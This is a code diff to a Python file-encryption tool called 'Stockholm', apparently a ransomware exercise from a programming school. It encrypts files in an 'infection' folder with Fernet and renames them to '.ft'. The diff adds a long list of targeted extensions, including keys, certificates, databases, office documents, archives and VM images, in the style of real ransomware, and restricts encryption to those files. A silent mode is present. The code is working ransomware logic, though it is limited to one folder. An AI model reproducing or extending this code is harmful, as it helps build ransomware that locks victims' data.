@@ -1,6 +1,9 @@
+#!/usr/bin/env python3
+
 import argparse
 from hashlib import pbkdf2_hmac
 from hashlib import sha256
+import stat
 import typing as tp
 from colorama import Fore, Style
 import sys
@@ -10,6 +13,29 @@ import base64
 
 SALT = b"stockholm"
 FOLDER = "infection"
+
+EXTENSIONS = [
+    ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw",
+    ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif",
+    ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm",
+    ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb",
+    ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf",
+    ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".bat",
+    ".ps1", ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php",
+    ".asp", ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla",
+    ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv",
+    ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd",
+    ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg",
+    ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak",
+    ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm",
+    ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf",
+    ".wk1", ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml",
+    ".msg", ".ost", ".pst", ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps",
+    ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt",
+    ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm",
+    ".docb", ".docx", ".doc"
+]
+
 
 class Stockholm:
 	def __init__(self, key: str, reverse: bool, silent: bool, dry_run: bool):
@@ -39,8 +65,15 @@ class Stockholm:
 		return True
 
 	@staticmethod
-	def check_file_extension(file: str) -> bool:
+	def check_file_extension_decryption(file: str) -> bool:
 		return file.endswith(".ft")
+
+	@staticmethod
+	def check_file_extension(file: str) -> bool:
+		for extension in EXTENSIONS:
+			if file.endswith(extension):
+				return True
+		return False
 
 	@staticmethod
 	def remove_file_extension(file: str) -> str:
@@ -57,7 +90,7 @@ class Stockholm:
 		return base64.urlsafe_b64encode(key) 
 
 	def encrypt(self, file: str, cipher: Fernet) -> None:
-		if self.check_file_extension(file):
+		if not self.check_file_extension(file):
 			self.log("info", f"File '{file}' is excluded from encryption.")
 			return
 		try:
@@ -76,7 +109,7 @@ class Stockholm:
 			self.log("error", f"Error: {e}")
 
 	def decrypt(self, file: str, cipher: Fernet) -> None:
-		if not self.check_file_extension(file):
+		if not self.check_file_extension_decryption(file):
 			self.log("info", f"File '{file}' is excluded from decryption.")
 			return
 		if self.dry_run:
